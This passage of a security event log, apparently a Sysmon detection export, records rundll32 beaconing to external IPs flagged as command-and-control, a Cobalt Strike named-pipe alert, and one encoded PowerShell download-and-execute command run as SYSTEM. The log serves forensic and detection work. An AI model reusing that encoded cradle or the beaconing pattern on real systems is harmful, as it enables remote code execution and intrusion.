Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50759</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:47:02+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50760,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:47:02.904140400Z""/>     <EventRecordID>148145</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:46:57.395</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50760</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:47:40+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50769,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:47:40.604447100Z""/>     <EventRecordID>148305</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:47:34.994</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50769</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:47:42+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50770,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:47:42.124903100Z""/>     <EventRecordID>148308</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:47:36.545</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50770</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:48:37+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50858,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:48:37.308453200Z""/>     <EventRecordID>148571</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:48:31.791</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50858</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:48:39+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,50864,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:48:39.626148300Z""/>     <EventRecordID>148581</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:48:34.030</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">50864</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:48:46+00:00,ACC-07,evtx_Microsoft-Windows-Sysmon/Operational,Execution,Cobalt Strike named pipe creation,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;17,17,5148,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,\PSHost.133042133263977217.5148.DefaultAppDomain.powershell,,,,,,,,,,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>17</EventID>     <Version>1</Version>     <Level>4</Level>     <Task>17</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:48:46.533299800Z""/>     <EventRecordID>182110</EventRecordID>     <Correlation/>     <Execution ProcessID=""1444"" ThreadID=""1932""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-07.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:48:46.533</Data>     <Data Name=""ProcessGuid"">{7A60D74F-9E4E-62ED-0000-00103738E801}</Data>     <Data Name=""ProcessId"">5148</Data>     <Data Name=""PipeName"">\PSHost.133042133263977217.5148.DefaultAppDomain.powershell</Data>     <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>   </EventData> </Event> "
2022-08-05 22:48:46+00:00,ACC-07,evtx_Microsoft-Windows-Sysmon/Operational,Execution,Download and execute Get-Y3J5cHRy,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;1,,5148,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,3208,C:\Windows\SysWOW64\rundll32.exe,,,,,,,,,,,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>1</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>1</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:48:46.397721700Z""/>     <EventRecordID>182109</EventRecordID>     <Correlation/>     <Execution ProcessID=""1444"" ThreadID=""1932""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-07.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:48:46.397</Data>     <Data Name=""ProcessGuid"">{7A60D74F-9E4E-62ED-0000-00103738E801}</Data>     <Data Name=""ProcessId"">5148</Data>     <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>     <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>     <Data Name=""Description"">Windows PowerShell</Data>     <Data Name=""Product"">Microsoft® Windows® Operating System</Data>     <Data Name=""Company"">Microsoft Corporation</Data>     <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA1ADkAOAA4ADYALwAnACkAOwAgAEcAZQB0AC0AWQAzAEoANQBjAEgAUgB5AA==</Data>     <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>     <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>     <Data Name=""LogonGuid"">{7A60D74F-9871-62ED-0000-00207BD9B001}</Data>     <Data Name=""LogonId"">0x0000000001b0d97b</Data>     <Data Name=""TerminalSessionId"">0</Data>     <Data Name=""IntegrityLevel"">System</Data>     <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>     <Data Name=""ParentProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>     <Data Name=""ParentProcessId"">3208</Data>     <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>   </EventData> </Event> "
